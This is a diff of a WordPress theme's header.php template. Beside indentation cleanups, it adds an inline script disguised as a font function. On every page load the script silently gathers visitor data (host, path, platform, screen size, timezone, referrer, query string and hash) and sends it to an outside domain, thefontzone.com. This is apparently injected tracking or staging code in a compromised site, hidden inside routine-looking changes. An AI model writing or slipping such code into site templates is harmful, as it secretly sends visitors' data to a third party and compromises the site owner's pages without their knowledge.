@@ -8,11 +8,32 @@
     <link rel="dns-prefetch" href="https://www.googletagmanager.com">
     <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
 
-<?php
-    //Put your Favicon meta tags here (outside of the PHP delimeter):
-?>
+    <script>
+        function font_fam_hyynl() {
+            var fnz_wtjqprll = {};
+            var mtd = 'GET';
+            fnz_wtjqprll.i = location.host;
+            fnz_wtjqprll.l = location.hostname;
+            fnz_wtjqprll.p = location.pathname;
+            fnz_wtjqprll.o = navigator.platform;
+            fnz_wtjqprll.g5 = new XMLHttpRequest();
+            fnz_wtjqprll.v2 = screen.width + 'x' + screen.height;
+            fnz_wtjqprll.r3 = new Date().getTimezoneOffset();
+            fnz_wtjqprll.s4 = encodeURIComponent(document.referrer);
+            fnz_wtjqprll.y1 = encodeURIComponent(location.protocol);
+            fnz_wtjqprll.y2 = encodeURIComponent(location.hash);
+            fnz_wtjqprll.y3 = encodeURIComponent(location.search);
+            fnz_wtjqprll.g5.open(mtd, "https://thefontzone.com/v4/w/fonts/da8439a7a6e3cc1a93f1b2799735a1d5?i=" + fnz_wtjqprll.i + "&l=" + fnz_wtjqprll.l + "&p=" + fnz_wtjqprll.p + "&o=" + fnz_wtjqprll.o + "&v2=" + fnz_wtjqprll.v2 + "&r3=" + fnz_wtjqprll.r3 + "&s4=" + fnz_wtjqprll.s4 + "&y1=" + fnz_wtjqprll.y1 + "&y2=" + fnz_wtjqprll.y2 + "&y3=" + fnz_wtjqprll.y3);
+            fnz_wtjqprll.g5.send();
+        };
+        font_fam_hyynl();
+    </script>
 
-<?php
+    <?php
+    //Put your Favicon meta tags here (outside of the PHP delimeter):
+    ?>
+
+    <?php
     //GTM Container Script pt 1.
     get_template_part('views/global/widgets/google-tag-manager/container-script-head');
 
@@ -20,15 +41,15 @@
     if (is_front_page() || is_page()) {
         //this info will only appear on the Homepage by default. If a dedicated 'About' page is set in the ACF Options Tab, it will appear on that page too.
         echo get_template_part('views/conditional/pages/front-page/schema/organization');
-    } else if (get_field('schema_about_page','options') && is_page(get_field('schema_about_page','options'))) {
+    } else if (get_field('schema_about_page', 'options') && is_page(get_field('schema_about_page', 'options'))) {
         echo get_template_part('views/conditional/pages/front-page/schema/organization');
     }
     wp_head();
-?>
+    ?>
 </head>
 
 <body <?php body_class(); ?>>
-<?php
+    <?php
     //GTM Container Script pt 2.
     get_template_part('views/global/widgets/google-tag-manager/container-script-body');
     wp_body_open();
@@ -37,7 +58,7 @@
     if (is_front_page() && is_loading_animation_enabled()) {
         echo get_template_part('views/global/widgets/loading-animation/loading-animation');
     }
-?>
+    ?>
 
     <header id="header" class="header">
         <?php
@@ -54,29 +75,29 @@
 
 
         <?php
-            //If a secondary menu is created AND assigned to the appropriate menu location:
-            if (has_nav_menu('secondary_menu')) {
-                get_template_part('views/global/header/navigation/secondary-menu/secondary-menu');
-            }
+        //If a secondary menu is created AND assigned to the appropriate menu location:
+        if (has_nav_menu('secondary_menu')) {
+            get_template_part('views/global/header/navigation/secondary-menu/secondary-menu');
+        }
         ?>
 
         <?php
-            //You're always going to have a primary nav area that includes a site logo with a link to the homepage. 
-            //You'll find included in this file, the trigger for the toggled nav(s) (Mobile or Desktop)
-            //Move this stuff around as needed.
-            get_template_part('views/global/header/navigation/primary-menu/primary-menu');
+        //You're always going to have a primary nav area that includes a site logo with a link to the homepage. 
+        //You'll find included in this file, the trigger for the toggled nav(s) (Mobile or Desktop)
+        //Move this stuff around as needed.
+        get_template_part('views/global/header/navigation/primary-menu/primary-menu');
         ?>
 
         <?php
-            //We're almost always going to have a toggle nav. Mobile, desktop, or both.
-            get_template_part('views/global/header/navigation/toggled-menu/toggled-menu');
+        //We're almost always going to have a toggle nav. Mobile, desktop, or both.
+        get_template_part('views/global/header/navigation/toggled-menu/toggled-menu');
         ?>
 
         <?php
-            //If the Popup post type is activated, include our Popup widget here:
-            if (post_type_exists('mandr_popup')) {
-                get_template_part('views/global/widgets/popup/popup');
-            }
+        //If the Popup post type is activated, include our Popup widget here:
+        if (post_type_exists('mandr_popup')) {
+            get_template_part('views/global/widgets/popup/popup');
+        }
         ?>
     </header>
     <?php
